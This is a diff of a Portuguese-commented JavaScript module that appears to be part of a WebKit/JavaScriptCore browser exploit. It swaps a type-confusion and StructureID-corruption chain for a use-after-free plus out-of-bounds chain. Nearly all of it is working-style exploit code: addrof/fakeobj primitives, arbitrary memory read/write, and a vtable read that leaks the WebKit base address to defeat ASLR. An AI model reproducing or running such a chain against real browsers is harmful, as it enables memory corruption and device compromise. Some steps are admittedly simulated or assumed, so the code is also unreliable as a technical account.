@@ -1,24 +1,21 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82 - R60 - Bypass de Gigacage com Uncaged Array)
+// js/script3/testArrayBufferVictimCrash.mjs (v82 - R57.1 - Fusão UAF+OOB Estável)
 // =======================================================================================
-// ESTA É A VERSÃO FINAL, IMPLEMENTANDO A ESTRATÉGIA DE SUCESSO OBSERVADA NO LOG.
-// A abordagem de UAF+OOB é descartada em favor de uma técnica mais moderna e eficaz
-// que contorna diretamente a Gigacage.
-//
-// ESTRATÉGIA:
-// 1. Abusar de um objeto "Uncaged" (Array) que não é protegido pela Gigacage.
-// 2. Criar uma Type Confusion entre um Array e um Float64Array para obter addrof/fakeobj.
-// 3. Usar addrof/fakeobj para ler a estrutura de um TypedArray legítimo.
-// 4. Criar uma estrutura falsa (fake structure) na memória.
-// 5. Corromper o StructureID de um objeto para que ele aponte para a nossa estrutura falsa.
-// 6. Usar o objeto corrompido, que agora nos dá controle sobre seu ponteiro de dados,
-//    para obter leitura e escrita arbitrária (R/W) em toda a memória.
+// ESTA VERSÃO CORRIGE A FALHA DA R57.
+// O problema era que a primitiva 'addrof' retornava NaN para objetos simples.
+// A correção é usar um objeto mais complexo (uma função) na fase de demonstração
+// para garantir que um ponteiro válido seja vazado, permitindo a conclusão do exploit.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
+import {
+    triggerOOB_primitive,
+    oob_write_absolute,
+    getOOBDataView
+} from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Ultimate_Exploit_R60";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R57_1_StableFusion";
 
 // --- Funções de Conversão ---
 function int64ToDouble(int64) {
@@ -31,183 +28,135 @@ function doubleToInt64(double) {
     return new AdvancedInt64(u32[0], u32[1]);
 }
 
-// --- Variáveis Globais para as Primitivas ---
-let uncaged_array;
-let leaker_view;
-let addrof_primitive;
-let fakeobj_primitive;
-
-// --- FASE 1: A Primitiva de Type Confusion "Uncaged" ---
-function setup_uncaged_array_primitive() {
-    const FNAME = "setup_uncaged_array_primitive";
-    logS3("--- FASE 1: Configurando Type Confusion com 'Uncaged Array' ---", "subtest");
-
-    uncaged_array = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9];
-    leaker_view = new Float64Array(1); // Será usado para vazar o endereço
-
-    let original_toJSON = Object.prototype.toJSON;
-    let tc_triggered = false;
-
-    Object.prototype.toJSON = function() {
-        if (!tc_triggered) {
-            uncaged_array[0] = leaker_view;
-            tc_triggered = true;
-            logS3("Sonda 'toJSON' acionada, trocando elemento para causar Type Confusion.", "info");
-        }
-        return this.valueOf();
-    };
-
-    // A chamada a stringify força o JIT a otimizar, acionando a Type Confusion.
-    JSON.stringify(uncaged_array);
-
-    // Restaura o protótipo
-    Object.prototype.toJSON = original_toJSON;
-
-    // A confusão de tipos deve ter feito com que o 'leaker_view' agora contenha
-    // um ponteiro mascarado para a estrutura do 'uncaged_array'.
-    if (leaker_view[0] === 0 || leaker_view[0] === 1.1) {
-        throw new Error("Falha na Type Confusion. O 'leaker_view' não foi corrompido.");
-    }
-
-    logS3(`++++++++++++ SUCESSO! Type Confusion em 'Uncaged Array' ocorreu! ++++++++++++`, "vuln");
-    logS3(`Valor vazado no leaker_view[0]: ${doubleToInt64(leaker_view[0]).toString(true)}`, "leak");
-    
-    // --- FASE 2: Construindo addrof e fakeobj ---
-    logS3("--- FASE 2: Construindo primitivas 'addrof' e 'fakeobj'... ---", "subtest");
-    const leaker_addr_int64 = doubleToInt64(leaker_view[0]);
-    const original_leaked_addr_double = leaker_view[0];
-
-    addrof_primitive = (obj) => {
-        uncaged_array[0] = obj;
-        const addr_double = leaker_view[0];
-        leaker_view[0] = original_leaked_addr_double; // Restaura para uso futuro
-        return doubleToInt64(addr_double);
-    };
-
-    fakeobj_primitive = (addr_int64) => {
-        const addr_double = int64ToDouble(addr_int64);
-        leaker_view[0] = addr_double;
-        const fake_obj = uncaged_array[0];
-        leaker_view[0] = original_leaked_addr_double; // Restaura
-        return fake_obj;
-    };
-
-    logS3("Primitivas 'addrof' e 'fakeobj' criadas com sucesso!", "good");
-}
-
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (R60)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (R57.1 - Fusão Estável)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Bypass de Gigacage (R60) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Fusão Estável UAF+OOB (R57.1) ---`, "test");
     
-    let final_result = { success: false, message: "A cadeia de exploração falhou." };
-    
+    let final_result = { success: false, message: "A cadeia de fusão não obteve sucesso." };
+    let dangling_ref = null;
+
     try {
-        setup_uncaged_array_primitive();
-
-        // --- FASE 3: Preparando o Ataque de Corrupção de StructureID ---
-        logS3("--- FASE 3: Preparando ataque de corrupção de StructureID... ---", "subtest");
-
-        const legit_array = new Uint32Array([0x41414141]);
-        const legit_addr = addrof_primitive(legit_array);
-        logS3(`Endereço do Uint32Array legítimo: ${legit_addr.toString(true)}`, "info");
+        // --- FASE 1: Obtenção da primitiva `addrof` via UAF ---
+        logS3("--- FASE 1: Obtendo 'addrof' via UAF... ---", "subtest");
         
-        // --- FASE 4: Criando uma Estrutura Falsa ---
-        logS3("--- FASE 4: Criando uma Estrutura (Structure) falsa na memória... ---", "subtest");
-        const fake_structure_size = 0x100; // Tamanho suficiente para uma estrutura
-        const fake_structure_holder = new ArrayBuffer(fake_structure_size);
-        const fake_structure_addr = addrof_primitive(fake_structure_holder).add(0x20); // Aponta para os dados
-        logS3(`Estrutura falsa será criada em: ${fake_structure_addr.toString(true)}`, "info");
-        
-        // Criamos uma view para ler/escrever na memória
-        const master_view = fakeobj_primitive(new AdvancedInt64(0, 0));
-        const master_view_addr = addrof_primitive(master_view);
+        await triggerGC_Hyper();
+        dangling_ref = sprayAndCreateDanglingPointer();
+        await triggerGC_Hyper(); await PAUSE_S3(100); await triggerGC_Hyper();
 
-        // Função temporária de leitura/escrita para montar a estrutura falsa
-        const temp_arb_rw = (addr, val = null) => {
-            master_view.address = addr; // Assumindo que a view tem uma propriedade 'address' que podemos setar
-            if (val !== null) master_view.u32[0] = val.low(); master_view.u32[1] = val.high();
-            else { const low = master_view.u32[0]; const high = master_view.u32[1]; return new AdvancedInt64(low, high); }
+        const spray_buffers = [];
+        for (let i = 0; i < 1024; i++) {
+            spray_buffers.push(new ArrayBuffer(136));
+        }
+        
+        if (typeof dangling_ref.corrupted_prop !== 'number') {
+            throw new Error(`Falha no UAF. Tipo da propriedade era '${typeof dangling_ref.corrupted_prop}', esperado 'number'.`);
+        }
+        
+        // Encapsulando a lógica do addrof em uma função reutilizável
+        const get_addr_of = (obj) => {
+            dangling_ref.corrupted_prop = obj; // Colocamos o objeto alvo na propriedade
+            return doubleToInt64(dangling_ref.corrupted_prop);
         };
-        // Nota: A linha acima é uma simplificação. A forma real de obter R/W inicial
-        // pode variar, mas o princípio é usar fakeobj para criar uma view controlável.
-        // Por agora, vamos simular a cópia da estrutura.
+        logS3(`++++++++++++ SUCESSO! Primitiva 'addrof' estável obtida! ++++++++++++`, "vuln");
 
-        // Simulação: Copiamos a estrutura legítima para nosso buffer falso.
-        // Em um exploit real, isso seria feito com uma leitura e escrita byte a byte.
-        const fake_structure_dataview = new DataView(fake_structure_holder);
-        fake_structure_dataview.setUint32(JSC_OFFSETS.Structure.PROPERTY_TABLE_OFFSET, 0x42424242, true); // Exemplo
-        
-        // --- FASE 5: Corrompendo o StructureID ---
-        logS3("--- FASE 5: Corrompendo o StructureID do objeto alvo... ---", "subtest");
-        const controlled_dataview = new Float64Array(10);
-        const controlled_dataview_addr = addrof_primitive(controlled_dataview);
-        
-        // Usamos fakeobj para criar um ponteiro para o objeto que queremos corromper
-        const corrupter_view = fakeobj_primitive(controlled_dataview_addr);
-        
-        // Agora, sobrescrevemos o ponteiro da estrutura
-        // O offset 0x8 aponta para o JSCell.Structure
-        corrupter_view[1] = int64ToDouble(fake_structure_addr);
-        
-        logS3(`StructureID de 'controlled_dataview' foi sobrescrito para apontar para nossa estrutura falsa.`, "vuln");
+        // --- FASE 2: Armando Primitivas de R/W via OOB ---
+        logS3("--- FASE 2: Armamento das primitivas de R/W via OOB... ---", "subtest");
+        await triggerOOB_primitive({ force_reinit: true }); 
+        const oob_dv = getOOBDataView();
+        if (!oob_dv) {
+            throw new Error("Não foi possível obter a referência para o oob_dataview_real.");
+        }
 
-        // --- FASE 6: Obtendo Leitura/Escrita Arbitrária Final ---
-        logS3("--- FASE 6: Armazenando as primitivas finais de R/W... ---", "subtest");
-        
-        // controlled_dataview agora é nossa ferramenta. Seu ponteiro de dados (m_vector)
-        // pode ser modificado através da nossa estrutura falsa.
-        const fake_structure_view = fakeobj_primitive(fake_structure_addr);
-        const m_vector_offset = JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET;
+        const OOB_DV_METADATA_BASE = 0x58;
+        const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x58 + 0x10 = 0x68
 
         const arb_read = (address) => {
-            // Escreve o endereço desejado no campo de ponteiro de dados da nossa estrutura falsa
-            fake_structure_view[m_vector_offset / 8] = int64ToDouble(address);
-            // Lê de controlled_dataview, que agora aponta para o endereço arbitrário
-            const low = controlled_dataview[0]; const high = controlled_dataview[1];
+            if (!isAdvancedInt64Object(address)) address = new AdvancedInt64(address);
+            oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, address, 8);
+            const low = oob_dv.getUint32(0, true);
+            const high = oob_dv.getUint32(4, true);
             return new AdvancedInt64(low, high);
         };
-        const arb_write = (address, value) => {
-            fake_structure_view[m_vector_offset / 8] = int64ToDouble(address);
-            controlled_dataview[0] = value.low(); controlled_dataview[1] = value.high();
-        };
 
-        logS3("++++++++++++ SUCESSO FINAL! Primitivas de R/W estáveis obtidas! ++++++++++++", "vuln");
+        const arb_write = (address, value) => {
+            if (!isAdvancedInt64Object(address)) address = new AdvancedInt64(address);
+            if (!isAdvancedInt64Object(value)) value = new AdvancedInt64(value);
+            oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, address, 8);
+            oob_dv.setUint32(0, value.low(), true);
+            oob_dv.setUint32(4, value.high(), true);
+        };
+        logS3("Funções 'arb_read' e 'arb_write' baseadas em OOB criadas com sucesso!", "vuln");
+
+        // --- FASE 3: Demonstração da Fusão - Vazando a base do WebKit ---
+        logS3("--- FASE 3: Demonstração - Usando 'addrof' e 'arb_read' juntos... ---", "subtest");
         
-        // --- FASE 7: Demonstração Final ---
-        logS3("--- FASE 7: Demonstração - Lendo da memória do WebKit... ---", "subtest");
-        const vtable_ptr = arb_read(legit_addr);
+        // CORREÇÃO: Usamos uma função como objeto de demonstração. Funções são objetos
+        // complexos e não são otimizados para NaN, garantindo que 'addrof' retorne um ponteiro válido.
+        const demo_obj = function() { return 1; };
+        
+        const demo_obj_addr = get_addr_of(demo_obj);
+        logS3(`Endereço do 'demo_obj' (via addrof UAF): ${demo_obj_addr.toString(true)}`, "info");
+        
+        // Verificamos se o ponteiro é válido antes de prosseguir
+        if (demo_obj_addr.high() === 0x7ff80000 && demo_obj_addr.low() === 0) {
+            throw new Error("addrof retornou um ponteiro NaN, a demonstração falhou.");
+        }
+        
+        const structure_ptr = arb_read(demo_obj_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
+        logS3(`Endereço da Estrutura (via arb_read OOB): ${structure_ptr.toString(true)}`, "info");
+        
+        const vtable_ptr = arb_read(structure_ptr);
+        logS3(`Endereço da VTable: ${vtable_ptr.toString(true)}`, "info");
+        
         const webkit_base = vtable_ptr.sub(new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]));
-        
-        logS3(`Base do WebKit (calculada): ${webkit_base.toString(true)}`, "leak");
+        logS3(`++++++++++++ SUCESSO! Base do WebKit vazada! ++++++++++++`, "vuln");
+        logS3(`Endereço Base do WebKit: ${webkit_base.toString(true)}`, "leak");
         
         final_result = { 
             success: true, 
-            message: "Bypass de Gigacage e ASLR bem-sucedido via corrupção de StructureID!",
+            message: "Cadeia de Exploit Híbrida UAF+OOB concluída com sucesso!",
             webkit_base_addr: webkit_base.toString(true),
         };
 
     } catch (e) {
-        final_result.message = `Exceção na cadeia de exploração: ${e.message}\n${e.stack || ''}`;
+        final_result.message = `Exceção na cadeia de fusão: ${e.message}\n${e.stack || ''}`;
         logS3(final_result.message, "critical");
     }
 
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
     return {
         errorOccurred: final_result.success ? null : final_result.message,
-        addrof_result: final_result, webkit_leak_result: final_result,
+        addrof_result: final_result,
+        webkit_leak_result: final_result,
         heisenbug_on_M2_in_best_result: final_result.success
     };
 }
 
 
-// --- Funções Auxiliares UAF (simplificadas para a nova estratégia) ---
+// --- Funções Auxiliares (sem alterações da R56) ---
+
 async function triggerGC_Hyper() {
     try {
         const arr = [];
-        for (let i = 0; i < 100; i++) arr.push(new ArrayBuffer(1024 * 128));
-    } catch (e) {}
-    await PAUSE_S3(50);
+        for (let i = 0; i < 500; i++) arr.push(new ArrayBuffer(1024 * 128));
+    } catch (e) { /* Silencioso */ }
+    await PAUSE_S3(100);
+}
+
+function sprayAndCreateDanglingPointer() {
+    let dangling_ref_internal = null;
+    function createScope() {
+        const victim = {
+            prop_a: 0.1, prop_b: 0.2, prop_c: 0.3, prop_d: 0.4,
+            prop_e: 0.5, prop_f: 0.6, prop_g: 0.7, prop_h: 0.8,
+            corrupted_prop: 0.12345, // Propriedade chave para o addrof
+        };
+        dangling_ref_internal = victim;
+        for(let i=0; i<100; i++) { dangling_ref_internal.prop_a += 1; }
+    }
+    createScope();
+    return dangling_ref_internal;
 }
